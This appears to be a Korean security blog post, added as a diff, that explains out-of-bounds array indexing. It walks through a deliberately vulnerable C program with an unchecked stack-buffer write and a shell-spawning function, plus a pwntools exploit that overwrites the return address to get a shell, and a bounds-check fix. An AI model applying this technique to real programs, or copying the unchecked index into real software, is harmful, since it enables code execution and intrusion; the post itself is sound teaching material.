@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] Out Of Bounds · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Out Of Bounds는 배열의 인덱스 값을 음수 혹은 배열의 크기를 벗어난 값을 입력했을 때 발생한다. 개발할 때 인덱스에 대한 검증 과정 코드만 넣어주면 방지가 가능하다. if (idx = 128) { printf(&quot;Invalid index!\">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-out-of-bounds/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-out-of-bounds/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-out-of-bounds/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] Out Of Bounds · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Out Of Bounds는 배열의 인덱스 값을 음수 혹은 배열의 크기를 벗어난 값을 입력했을 때 발생한다. 개발할 때 인덱스에 대한 검증 과정 코드만 넣어주면 방지가 가능하다. if (idx = 128) { printf(&quot;Invalid index!\"><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-out-of-bounds/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] Out Of Bounds","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Out Of Bounds는 배열의 인덱스 값을 음수 혹은 배열의 크기를 벗어난 값을 입력했을 때 발생한다. 개발할 때 인덱스에 대한 검증 과정 코드만 넣어주면 방지가 가능하다. if (idx = 128) { printf(\"Invalid index!\\","datePublished":"2024-06-24","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-out-of-bounds/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-out-of-bounds/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] Out Of Bounds</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Out Of Bounds는 배열의 인덱스 값을 음수 혹은 배열의 크기를 벗어난 값을 입력했을 때 발생한다. 개발할 때 인덱스에 대한 검증 과정 코드만 넣어주면 방지가 가능하다. if (idx = 128) { printf(&quot;Invalid index!\</p><div class="article-meta"><time datetime="2024-06-24">2024년 6월 24일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다.</strong> <strong>※</strong> </p>
+<p>Out Of Bounds는 배열의 인덱스 값을 음수 혹은 배열의 크기를 벗어난 값을 입력했을 때 발생한다.</p>
+<p>개발할 때 인덱스에 대한 검증 과정 코드만 넣어주면 방지가 가능하다.</p>
+<pre><code>    if (idx &lt; 0 || idx &gt;= 128) {
+        printf(&quot;Invalid index!\n&quot;);
+        return;
+    }
+</code></pre>
+<p>아래 예제를 가지고 살펴보도록 하겠다.</p>
+<pre><code>// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void gift() {
+	printf(&quot;Hello! ZZoMblE&quot;);
+	system(&quot;/bin/sh&quot;);
+}
+void initialize() {
+	setvbuf(stdin, NULL, _IONBF, 0);
+	setvbuf(stdout, NULL, _IONBF, 0);
+}
+void vuln() {
+	char buf[128];
+	int idx = 0;
+	printf(&quot;input idx : &quot;);
+	scanf(&quot;%d&quot;, &amp;idx);
+
+	printf(&quot;input change value : &quot;);
+	read(0, buf[idx],0x10);
+
+}
+int main() {
+	initialize();
+	vuln();
+	return 0;
+}
+</code></pre>
+<p>이번에도 vuln()의 입력에서 취약점이 발생한다.</p>
+<p>사용자가 원하는 인덱스 위치에 값을 0x10만큼 쓸 수가 있기 때문에 ret의 인덱스만 계산을 한다면 Return Address Overflow를 수행할 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-58fe9a713fd6/001.png" alt=""></p>
+<p>idx에 0을 넣어준 상태이다.</p>
+<p>ret와 buf는 136만큼 떨어져 있기 때문에, idx에 136을 입력하면 ret 위치에 overwrite가 가능하다는 것을 알아낼 수 있다.</p>
+<p>ret에 그대로 gift()를 덮어쓰고 싶지만, 현재 상태에서는 스택 정렬이 맞지 않기 때문에 ret gadget을 하나 써주어 맞춰준다.</p>
+<pre><code>from pwn import *
+
+target = b'./ex'
+
+p = process(target)
+e = ELF(target)
+
+gift = e.sym['gift']
+ret = 0x000000000040101a
+
+payload = p64(ret)
+payload += p64(gift)
+
+p.sendlineafter(b': ',b'136')
+p.sendafter(b':', payload)
+
+p.interactive()
+</code></pre>
+<p>실행해보면 shell을 얻은 것을 확인할 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-58fe9a713fd6/002.png" alt=""></p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-out-of-bounds/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
